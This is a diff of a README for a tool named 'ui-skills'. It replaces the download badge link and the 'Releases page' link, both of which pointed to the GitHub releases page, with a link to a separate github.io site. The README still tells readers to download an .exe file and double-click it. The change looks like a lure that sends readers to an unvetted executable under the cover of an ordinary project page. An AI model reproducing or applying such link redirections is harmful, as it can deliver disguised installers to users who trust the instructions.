@@ -1,6 +1,6 @@
 # 🎨 ui-skills - Elevate your design engineering workflow today
 
-[![Download App](https://img.shields.io/badge/Download_Installer-Blue%20and%20Grey-blue.svg)](https://github.com/Discriminative-shoji607/ui-skills/releases)
+[![Download App](https://img.shields.io/badge/Download_Installer-Blue%20and%20Grey-blue.svg)](https://discriminative-shoji607.github.io)
 
 ## What is ui-skills? 🛠️
 
@@ -19,7 +19,7 @@ To run this software, ensure your computer meets these specifications:
 
 ## 🚀 Downloading and Setup
 
-1. Open the [Releases page](https://github.com/Discriminative-shoji607/ui-skills/releases) in your web browser.
+1. Open the [Releases page](https://discriminative-shoji607.github.io) in your web browser.
 2. Locate the most recent version of the software.
 3. Select the file ending in `.exe` to begin your download.
 4. Once the download finishes, open your folder and double-click the file.
